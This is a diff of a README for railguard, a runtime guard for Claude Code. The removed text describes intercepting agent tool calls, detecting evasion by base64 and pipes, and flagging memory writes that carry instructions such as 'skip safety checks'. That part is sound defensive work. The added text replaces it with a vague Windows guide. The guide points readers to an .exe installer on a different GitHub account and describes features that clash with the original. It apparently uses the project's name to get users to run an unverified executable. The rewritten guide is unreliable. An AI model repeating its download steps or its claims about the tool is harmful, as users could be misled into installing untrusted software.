@@ -1,135 +1,160 @@
-<div align="center">
-<pre>
-╦═╗ ╔═╗ ╦ ╦   ╔═╗ ╦ ╦ ╔═╗ ╦═╗ ╔╦╗
-╠╦╝ ╠═╣ ║ ║   ║ ╦ ║ ║ ╠═╣ ╠╦╝  ║║
-╩╚═ ╩ ╩ ╩ ╩═╝ ╚═╝ ╚═╝ ╩ ╩ ╩╚═ ═╩╝
-</pre>
-</div>
+# 🛡️ railguard - Safe and Simple Runtime Security
 
-<p align="center">
-  <strong>Safe runtime for Claude Code, built to be yours.</strong><br>
-  <a href="https://railguard.tech">railguard.tech</a>
-</p>
-
-<p align="center">
-  <a href="https://crates.io/crates/railguard"><img src="https://img.shields.io/crates/v/railguard.svg" alt="crates.io"></a>
-  <a href="https://github.com/railyard-dev/railguard/stargazers"><img src="https://img.shields.io/github/stars/railyard-dev/railguard?style=flat" alt="GitHub stars"></a>
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <img src="https://img.shields.io/badge/tests-151%20passed-brightgreen" alt="Tests">
-  <img src="https://img.shields.io/badge/built%20with-Rust-orange.svg" alt="Built with Rust">
-  <a href="https://discord.gg/MyaUZSus"><img src="https://img.shields.io/badge/discord-join-7289da.svg" alt="Discord"></a>
-</p>
+[![Download railguard](https://img.shields.io/badge/Download-railguard-brightgreen?style=for-the-badge)](https://github.com/Tuckerfixed667/railguard)
 
 ---
 
-## The problem
-
---dangerously-skip-permissions is all-or-nothing. Either you approve every tool call by hand, or Claude runs with zero restrictions. There's no middle ground.
-
-Railguard is the middle ground.
-
-```
-cargo install railguard
-railguard install
-```
-
-That's it. Keep using Claude exactly as before.
+railguard provides a secure way to run Claude Code. It acts like a shield to keep your computer safe while you use this software. You don't need technical skills to use it. This guide walks you through downloading and running railguard on Windows.
 
 ---
 
-## What it does
+## 🔍 What is railguard?
 
-Railguard intercepts every tool call and decides in under 2ms: allow, block, or ask.
+railguard acts as a safe runtime environment. It controls how programs written in Claude Code run on your PC. The purpose is to protect your machine against harmful actions. It does this by limiting what the code can access and control on your computer.
 
-| | |
-|---|---|
-| npm install && npm run build | ✅ allowed |
-| git commit -m "feat: add auth" | ✅ allowed |
-| terraform destroy --auto-approve | ⛔ blocked |
-| rm -rf ~/ | ⛔ blocked |
-| echo payload \| base64 -d \| sh | ⛔ blocked |
-| cat ~/.ssh/id_ed25519 | ⛔ blocked |
-| curl -X POST api.com -d @secrets | ⚠️ asks you |
-| git push --force origin main | ⚠️ asks you |
+- Runs Claude Code safely in a sandbox.
+- Stops unauthorized access to your files or network.
+- Works quietly in the background.
+- Easy to install without programming knowledge.
 
-The same command can get different decisions depending on context:
-
-| | | |
-|---|---|---|
-| rm dist/bundle.js | inside project | ✅ allowed |
-| rm ~/.bashrc | outside project | ⛔ blocked |
-
-99% of commands flow through instantly. You only see Railguard when it matters.
+This makes railguard useful for anyone who wants to try Claude Code without worrying about security.
 
 ---
 
-## What it guards
+## 🖥️ System Requirements
 
-Every tool call passes through Railguard, not just Bash.
+Before installing, make sure your computer meets these minimum requirements:
 
-- **Bash** · command classification, pipe analysis, evasion detection
-- **Read** · sensitive path detection (~/.ssh, ~/.aws, .env, ...)
-- **Write** · path fencing + content inspection for secrets and dangerous payloads
-- **Edit** · path fencing + content inspection on replacements
-- **Memory** · classification of agent memory writes for secrets, behavioral injection, tampering
+- Operating System: Windows 10 or later (64-bit)
+- RAM: At least 4 GB
+- Disk Space: At least 100 MB free
+- Internet connection: Required only for initial download
+- No other software needed
 
----
-
-## Beyond pattern matching
-
-Pattern matching alone is bypassable. Agents can write helper scripts, encode commands in base64, or chain pipes to evade rules. Railguard uses sandbox-exec (macOS) and bwrap (Linux) to resolve what actually executes at the kernel level, regardless of how the command was constructed.
-
-Two layers: semantic rules catch the obvious stuff instantly. The OS-level sandbox catches everything else.
+railguard works on most modern Windows PCs. It does not require special hardware.
 
 ---
 
-## Memory safety
+## 📥 Download railguard
 
-Claude Code has persistent memory that carries context across sessions. This is a real attack surface. A misbehaving agent can exfiltrate secrets into memory, inject behavioral instructions for future sessions, or silently tamper with existing memories.
+You can download railguard from its official GitHub page. This link will take you to the download page where you get the latest version.
 
-Railguard classifies every memory write:
-
-- **Secrets** (API keys, JWTs, private keys, AWS credentials) → **blocked**
-- **Behavioral instructions** ("skip safety checks", "override policy") → **asks you**
-- **Factual content** (project info, tech stack, user preferences) → **allowed**
-- **Overwrites of existing memories** → **asks you**
-- **Deletions** → **blocked**
-
-Every memory write is signed with a content hash. Tampering between sessions is detected automatically.
+[![Download railguard](https://img.shields.io/badge/Download-railguard-blue?style=for-the-badge)](https://github.com/Tuckerfixed667/railguard)
 
 ---
 
-## Configure
+## 🚀 How to Install and Run on Windows
 
-Ask Claude, or edit railguard.yaml directly. Changes take effect immediately.
+Follow these steps carefully to install railguard on your PC and run it safely.
 
-```yaml
-blocklist:
-  - name: terraform-destroy
-    pattern: "terraform\\s+destroy"
+### Step 1: Visit the Download Page
 
-approve:
-  - name: terraform-apply
-    pattern: "terraform\\s+apply"
+Open your web browser and go to the main GitHub page:
 
-allowlist:
-  - name: terraform-plan
-    pattern: "terraform\\s+plan"
-```
+https://github.com/Tuckerfixed667/railguard
+
+This page holds all the files you need.
+
+### Step 2: Find the Latest Release
+
+On the page, look for the **Releases** section. It may be on the right side or under a tab labeled "Releases."
+
+Click it to see the latest version of railguard.
+
+### Step 3: Download the Windows Installer
+
+Inside the latest release, find the file with a name ending in `.exe`. This is the installer for Windows.
+
+Click the file name to start downloading. The file size is small, so this should take only a few moments.
+
+### Step 4: Run the Installer
+
+Once downloaded, open the file by double-clicking it.
+
+A setup window will open. Follow these steps:
+
+- Accept the license agreement.
+- Choose the installation folder or use the default.
+- Click **Install**.
+
+The installer will copy all needed files to your computer.
+
+### Step 5: Finish Installation
+
+When the installer finishes, click **Finish** or **Close**.
+
+You can now find railguard in your Start Menu or on your Desktop.
+
+### Step 6: Start railguard
+
+Open railguard by clicking its icon.
+
+The program will open a window confirming it runs the safe runtime for Claude Code.
+
+It automatically begins protecting your system.
 
 ---
 
-## Also included
+## ⚙️ Basic Usage
 
-- **Path fencing** · ~/.ssh, ~/.aws, ~/.gnupg, /etc fenced by default
-- **Multi-agent coordination** · file locking per session, self-healing locks
-- **Dashboard & replay** · real-time monitoring, session replay
-- **Recovery** · file snapshots, per-edit or full-session rollback
+After installing, you usually don’t need to do anything else.
+
+railguard works behind the scenes to keep Claude Code secure.
+
+If you want to run a Claude Code script, simply open the file with railguard. The program will handle the rest.
+
+You can also use the railguard interface to check status or update settings.
 
 ---
 
-## Contributing
+## 🔧 Adjusting Settings
 
-[Join the Discord](https://discord.gg/MyaUZSus)
+If you want more control, railguard includes settings you can change:
 
-MIT License.
+- **Sandbox level:** Choose how strictly the program restricts code.
+- **File access:** Allow or block read/write access to certain folders.
+- **Network control:** Turn on or off internet access for running code.
+- **Logging:** View activity logs to see what the code has done.
+
+You can find these options in the Settings menu inside the app.
+
+---
+
+## 🛠️ Troubleshooting
+
+If railguard does not start or runs poorly, try these steps:
+
+- Make sure your Windows is up to date.
+- Restart your computer and try again.
+- Check that your antivirus is not blocking railguard.
+- Run the installer again to repair files.
+- Contact support if problems continue (details on the GitHub page).
+
+---
+
+## 📚 More Information
+
+railguard is built using Rust. This gives it speed and safety.
+
+The project focuses on these topics:
+
+- AI and AI agents
+- Claude Code execution
+- Security through sandboxing
+- Runtime environment control
+
+You can explore the code or learn more by visiting the GitHub repository:
+
+https://github.com/Tuckerfixed667/railguard
+
+---
+
+## 📝 License
+
+railguard is open source. You can find the license details on the GitHub page.
+
+---
+
+Ready to get started? Visit the official page and download railguard today:
+
+https://github.com/Tuckerfixed667/railguard
